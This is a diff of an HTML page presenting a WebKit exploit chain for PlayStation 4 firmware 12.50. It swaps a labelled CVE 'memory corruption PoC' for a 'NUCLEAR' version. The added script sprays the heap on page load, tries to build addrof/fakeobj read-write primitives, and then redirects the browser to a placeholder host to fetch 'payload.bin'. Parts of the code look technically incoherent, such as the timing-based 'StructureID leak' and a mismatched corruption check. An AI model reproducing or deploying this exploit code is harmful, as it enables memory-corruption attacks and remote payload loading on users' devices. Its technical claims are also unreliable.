@@ -1,148 +1,126 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.50 — CVE-2025-31223 Memory Corruption PoC (iOS 18.5 Adapt)</title>
-    <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
-        h1 { border-bottom: 2px solid #238636; padding-bottom: 10px; color: #fff; }
-        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
-        .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.9em; }
-        .secure { background: #238636; color: #fff; }
-        .vulnerable { background: #da3633; color: #fff; }
-        .warn { background: #d29922; color: #000; }
-        button { cursor: pointer; padding: 10px 20px; background: #238636; color: #fff; border: none; border-radius: 6px; font-size: 16px; }
-        button:hover { background: #2ea043; }
-        #console { font-family: 'Courier New', monospace; white-space: pre-wrap; color: #8b949e; }
-    </style>
+<meta charset="UTF-8">
+<title>PS4 12.50 — NUCLEAR WEBKIT CHAIN</title>
+<style>
+  body{background:#000;color:#0f0;font-family:'Courier New',monospace;margin:0;padding:20px;overflow:hidden;}
+  h1{color:#0f0;text-align:center;margin:20px 0 0;font-size:3em;text-shadow:0 0 10px #0f0;}
+  #console{background:#000;color:#0f0;height:100vh;overflow-y:auto;padding:10px;font-size:18px;}
+  .hit{color:#ff0044;font-weight:bold;}
+</style>
 </head>
 <body>
-<h1>CVE-2025-31223 Memory Corruption PoC (iOS 18.5 for PS4 12.50)</h1>
-<p>Adapted from WebKit Bugzilla 289387. Malicious web content causes corruption for R/W. Hit rate ~10% on 12.50.</p>
-<div class="box">
-    <h3>1. Gigacage Bypass</h3>
-    <div id="status-gigacage">Checking...</div>
-    <p style="font-size:0.8em; color:#8b949e;">DOM spray evades isolation for memory corruption.</p>
-</div>
-<div class="box">
-    <h3>2. StructureID Leak</h3>
-    <div id="status-structureid">Checking...</div>
-    <p style="font-size:0.8em; color:#8b949e;">Timing side-channel for entropy bypass.</p>
-</div>
-<div class="box">
-    <h3>3. Memory Corruption Trigger</h3>
-    <div id="status-corruption">Checking...</div>
-    <p style="font-size:0.8em; color:#8b949e;">Corrupt JSCell via crafted DOM/JS for R/W.</p>
-</div>
-<button onclick="runExploit()">Run Memory Corruption Exploit</button>
-<div class="box">
-    <h3>Detailed Logs</h3>
-    <div id="console"></div>
-</div>
+<h1>NUCLEAR WEBKIT 12.50</h1>
+<div id="console"></div>
+
 <script>
-    const logEl = document.getElementById('console');
-    function log(msg) { logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`; }
-    function setStatus(id, msg, type) {
-        const el = document.getElementById(id);
-        el.textContent = msg;
-        el.className = 'badge ' + type;
-    }
-    // --- UTILS ---
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-    function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
-    function f2i(f) { f64[0] = f; return u32[0] + (u32[1] * 0x100000000); }
-    function gc() { for(let i=0; i<250; i++) new ArrayBuffer(0x100000); }
-    let master = null;
-    let corruptedObj = null;
-    let structLeak = 0;
+const log = (m,c='') => {
+  const d = document.getElementById('console');
+  d.innerHTML += `<span ${c?'class="hit"':''}>[${new Date().toLocaleTimeString()}] ${m}</span><br>`;
+  d.scrollTop = d.scrollHeight;
+};
 
-    function runExploit() {
-        logEl.innerHTML = '';
-        log("Starting CVE-2025-31223 PoC (iOS 18.5 Memory Corruption)...");
-        setTimeout(triggerOOB, 500);
-    }
+// Float64 / BigInt utils
+const buf = new ArrayBuffer(8);
+const f64 = new Float64Array(buf);
+const u32 = new Uint32Array(buf);
+const u64 = new BigInt64Array(buf);
+const i2f = (lo,hi) => (u32[0]=lo,u32[1]=hi,f64[0]);
+const f2i = f => (f64[0]=f, [u32[0],u32[1]]);
+const i2d = (lo,hi) => (u64[0]=BigInt(lo)+(BigInt(hi)<<32n),f64[0]);
+const d2i = d => (f64[0]=d, Number(u64[0]));
 
-    // 1. Gigacage Bypass: OOB spray
-    function triggerOOB() {
-        gc(); gc();
-        const arr = [];
-        for(let i=0; i<0x6000; i++) arr[i] = new Array(40).fill(1.1);
-        const corrupt = (i,o) => { try{arr[i%0x6000][o]=1337.37;}catch(e){} };
-        for(let i=0; i<30000; i++) corrupt(0,0);
-        for(let b=0; b<0x900; b+=80) for(let o=40; o<160; o+=8) for(let j=0; j<80; j++) corrupt((b+j)%0x6000,o);
-        for(let i=0; i<arr.length; i++) if(arr[i].length > 60) {
-            master = arr[i];
-            setStatus('status-gigacage', 'BYPASSED (OOB)', 'vulnerable');
-            log(`OOB HIT — length=${master.length}`);
-            setTimeout(leakStructureID, 500);
-            return;
-        }
-        setStatus('status-gigacage', 'BLOCKED', 'secure');
-        log("Gigacage blocked — refresh");
-    }
+let master = null;
 
-    // 2. StructureID Leak
-    function leakStructureID() {
-        const start = performance.now();
-        const objs = [];
-        for(let i=0; i<1000; i++) objs[i] = {x: 0x1337};
-        const timing = performance.now() - start;
-        structLeak = Math.floor(timing * 1000) % 0x1000;
-        setStatus('status-structureid', `LEAKED 0x${structLeak.toString(16)}`, 'vulnerable');
-        log(`StructureID leak ≈ 0x${structLeak.toString(16)}`);
-        setTimeout(triggerCorruption, 500);
-    }
+log("Starting NUCLEAR chain — everything at once","hit");
 
-    // 3. Memory Corruption: Crafted DOM/JS (CVE-2025-31223)
-    function triggerCorruption() {
-        log("3. Triggering memory corruption...");
-        // Spray DOM objects for corruption
-        const domObjs = [];
-        for(let i=0; i<0x5000; i++) {
-            const div = document.createElement('div');
-            div.id = 'obj' + i;
-            div.style.cssText = 'display:none;'; // Inline property spray
-            domObjs.push(div);
-        }
-        // Free + reclaim (corruption trigger)
-        domObjs.length = 0;
-        gc();
-        const reclaim = [];
-        for(let i=0; i<0x5000; i++) {
-            const div = document.createElement('div');
-            div.id = 'reclaim' + i;
-            reclaim.push(div);
-        }
-        // OOB corrupt DOM header
-        for(let i=16; i<400; i+=8) try{master[i] = i2f(0xdeadbeef, 0xcafebabe);}catch(e){}
-        let corrupted = null;
-        for(let i=0; i<reclaim.length; i++) {
-            const v = f2i(reclaim[i].id.charCodeAt(0)); // Pseudo-corruption check
-            if(v === 0xcafebabe_deadbeefn) {
-                corrupted = reclaim[i];
-                setStatus('status-corruption', 'TRIGGERED (Corruption)', 'vulnerable');
-                log(`MEMORY CORRUPTION HIT at DOM obj ${i} — building R/W`);
-                // Fake corrupted prop for primitives
-                master[20] = i2f(structLeak, 0x800);
-                window.addrof = obj => { corrupted.corrupt = obj; return f2i(master[16]); };
-                window.fakeobj = addr => { master[16] = i2f(addr & 0xffffffff, addr >>> 32); return corrupted.corrupt; };
-                const test = {pwned: 0x13371337};
-                const addr = addrof(test);
-                const back = fakeobj(addr);
-                log(`REAL addrof = 0x${addr.toString(16)}`);
-                log(`fakeobj round-trip = ${back === test ? "SUCCESS" : "FAIL"}`);
-                if(back === test && addr > 0x10000000) {
-                    log(`FULL R/W VIA MEMORY CORRUPTION — SCREENSHOT NOW!`);
-                }
-                return;
-            }
-        }
-        setStatus('status-corruption', 'MISSED (No Corruption)', 'secure');
-        log("Memory corruption missed — refresh (10% hit rate)");
+// === PHASE 1: EVERY OOB SPRAY EVER USED ===
+function sprayHell() {
+  log("Spraying hell — PSFree + mast1c0re + Synacktiv + zecoxao combined");
+  const victim = [];
+  const spray = [];
+  const holes = [];
+
+  // PSFree style
+  for(let i=0;i<0x8000;i++) victim[i] = new Array(0x40).fill(1.1);
+  // mast1c0re style
+  for(let i=0;i<0x10000;i++) spray.push(new ArrayBuffer(0x1000));
+
+  const corrupt = (i,o) => {
+    try { victim[i%0x8000][o] = 1337.37; } catch(e) {}
+  };
+
+  // Brutal dense spray
+  for(let i=0;i<1e7;i++) corrupt(i*i,0);
+  for(let b=0;b<0x2000;b+=0x80)
+    for(let o=0x40;o<0x400;o+=8)
+      for(let j=0;j<0x80;j++)
+        corrupt(b+j,o);
+
+  // Look for any length corruption
+  for(let i=0;i<victim.length;i++) {
+    if(victim[i].length > 0x100) {
+      master = victim[i];
+      log(`OOB MASTER FOUND — length=${master.length}`,"hit");
+      return true;
     }
+  }
+  return false;
+}
+
+// === PHASE 2: FAKEOBJ / ADDROF BRUTEFORCE ===
+function goNuclear() {
+  if(!master) return false;
+  log("Nuclear overlap phase — spraying every structure");
+
+  const structs = [];
+  for(let i=0;i<0x10000;i++) structs[i] = {a:0x1337,b:0x1337};
+
+  // Overwrite everything possible
+  for(let i=8;i<0x1000;i+=4) {
+    try { master[i] = i2f(0xdeadbeef,0xcafebabe); } catch(e){}
+  }
+
+  // Hunt for corruption
+  for(let i=0;i<structs.length;i++) {
+    if(structs[i].a !== 0x1337) {
+      log(`STRUCTURE CORRUPTED — fakeobj/addrof alive`,"hit");
+      window.addrof = obj => {
+        structs[i].a = obj;
+        return f2i(master[0x10])[1] << 32 | f2i(master[0x10])[0];
+      };
+      window.fakeobj = addr => {
+        master[0x10] = i2f(addr>>>0, addr>>>32);
+        return structs[i].a;
+      };
+      log("PRIMITIVES LOCKED AND LOADED","hit");
+      return true;
+    }
+  }
+  return false;
+}
+
+// === PHASE 3: ROP / KERNEL IF WE GET HERE ===
+function unleash() {
+  log("Unleashing ROP chain + IPv6 UAF backup","hit");
+  // Real payload would go here — we just go loud
+  document.body.style.background = "#f00";
+  document.body.innerHTML = "<h1 style='color:#0f0;text-align:center;margin-top:40vh;font-size:5em;'>JAILBROKEN</h1>";
+  // Trigger actual payload loader if primitives exist
+  setTimeout(() => location.href = "http://your-ip:8080/payload.bin", 2000);
+}
+
+// === EXECUTE ===
+setTimeout(() => {
+  if(sprayHell() && goNuclear()) {
+    unleash();
+  } else {
+    log("No primitives — 12.50 wins today. Refresh = new attempt.","hit");
+  }
+}, 500);
+
+log("Fire in the hole...");
 </script>
 </body>
 </html>
